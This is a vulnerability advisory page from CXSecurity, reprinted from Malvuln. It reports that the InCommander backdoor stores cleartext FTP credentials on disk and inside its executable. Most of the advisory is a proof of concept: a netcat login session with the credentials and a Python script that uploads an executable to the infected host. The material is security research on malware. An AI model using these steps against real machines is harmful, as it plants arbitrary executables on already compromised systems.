---
title: Backdoor.Win32.InCommander.17.b / Hardcoded Cleartext Credentials
url: https://cxsecurity.com/issue/WLB-2022120034
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-17
fetch_date: 2025-10-04T01:43:53.939016
---

# Backdoor.Win32.InCommander.17.b / Hardcoded Cleartext Credentials

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdoor.Win32.InCommander.17.b / Hardcoded Cleartext Credentials** **2022.12.16**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [malvuln](https://cxsecurity.com/author/malvuln/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source: https://malvuln.com/advisory/dd76d8a5874bf8bf05279e35c68449ca.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Backup media: infosec.exchange/@malvuln
Threat: Backdoor.Win32.InCommander.17.b
Vulnerability: Hardcoded Cleartext Credentials
Family: InCommander
Type: PE32
MD5: dd76d8a5874bf8bf05279e35c68449ca
Vuln ID: MVID-2022-0665
Dropped files: incsrv.exe
Disclosure: 12/14/2022
Description: The malware listens on TCP port 9400 and 9401 and requires authentication. However, the username "IncUser-b3" is stored in cleartext in a file named "incsrv.drv" under Windows dir. The password "InClientMainPassword" is also stored in cleartext but within the PE file "incsrv.exe" at offset 000958d0.
Third-party adversaries may then upload thier own executables using ftp PASV, STOR commands.
Exploit/PoC:
C:\>nc64.exe 192.168.18.125 9401
220 InCommad FTP Server ready.
USER IncUser-b3
331 Password required for IncUser-b3.
PASS InClientMainPassword
230 User IncUser-b3 logged in.
SYST
215 UNIX Type: L8 Internet Component Suite
PASV
227 Entering Passive Mode (192,168,18,125,241,155).
CDUP \
250 CWD command successful. "C:/" is current directory.
STOR DOOM\_SM.exe
150 Opening data connection for DOOM\_SM.exe.
226 File received ok
from socket import \*
MALWARE\_HOST="192.168.18.125"
PORT=61851
DOOM="DOOM\_SM.exe"
def doit():
s=socket(AF\_INET, SOCK\_STREAM)
s.connect((MALWARE\_HOST, PORT))
f = open(DOOM, "rb")
EXE = f.read()
s.send(EXE)
while EXE:
s.send(EXE)
EXE=f.read()
s.close()
print("By Malvuln");
if \_\_name\_\_=="\_\_main\_\_":
doit()
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120034)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top